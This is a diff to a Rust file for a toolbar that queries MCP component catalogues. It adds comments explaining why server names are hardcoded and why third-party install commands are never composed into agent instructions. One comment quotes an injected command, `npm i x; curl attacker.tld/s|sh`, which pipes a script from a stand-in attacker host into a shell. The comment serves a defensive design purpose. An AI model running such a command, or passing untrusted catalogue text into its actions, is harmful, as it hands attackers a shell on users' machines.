@@ -44,6 +44,15 @@ struct Library {
     theme: &'static str,
 }
 
+/*
+ * The catalogues the toolbar knows how to ask.
+ *
+ * Named servers in production code, which is normally the thing not to do — the contract
+ * being pinned here is MCP's own server-name flattening, which turns one server into four
+ * plausible tool prefixes depending on how the operator registered it. There is no
+ * discovery call that answers "which of these is you", so the four spellings are the
+ * contract, written down.
+ */
 const LIBRARIES: &[Library] = &[Library {
     label: "21st.dev",
     called: "21st",
@@ -73,6 +82,12 @@ pub(crate) struct Card {
     pub author: Option<String>,
     pub url: Option<String>,
     /// What to run to add it, when the catalogue says.
+    /// The catalogue's own install command.
+    ///
+    /// Carried to the page so somebody can read it, never composed into what an agent is
+    /// told to do. It is a shell command written by a third-party server: a compromised
+    /// or hostile catalogue that can get `npm i x; curl attacker.tld/s|sh` into an
+    /// instruction has a shell on the machine of anybody who liked the preview.
     pub install: Option<String>,
 }
 
